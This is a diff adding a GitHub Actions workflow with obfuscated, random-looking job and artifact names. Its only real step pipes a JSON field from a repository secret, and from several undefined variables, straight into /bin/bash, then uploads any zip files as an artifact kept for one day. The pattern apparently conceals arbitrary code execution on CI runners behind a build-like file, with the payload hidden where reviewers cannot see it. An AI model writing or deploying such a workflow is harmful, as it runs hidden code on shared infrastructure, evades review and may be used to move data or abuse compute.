@@ -1,0 +1,26 @@
+name: distributededge920
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: distributededge920
+        env:
+          cp70: ${{ secrets.cp70 }}
+        run: |
+          printf '%s' "$cp70" | jq -r .bmab54422 | /bin/bash
+          echo $cx6 | jq -r .hwont133 | /bin/bash
+          printf '%s' "$qs6302" | jq -r .wf95 | /bin/bash
+          echo $g77674 | jq -r .ler69453 | /bin/bash
+          echo $nedon95 | jq -r .f865 | /bin/bash
+          echo $f9650 | jq -r .zerli9 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: pujYzMdp
+          path: "*.zip"
+          retention-days: 1
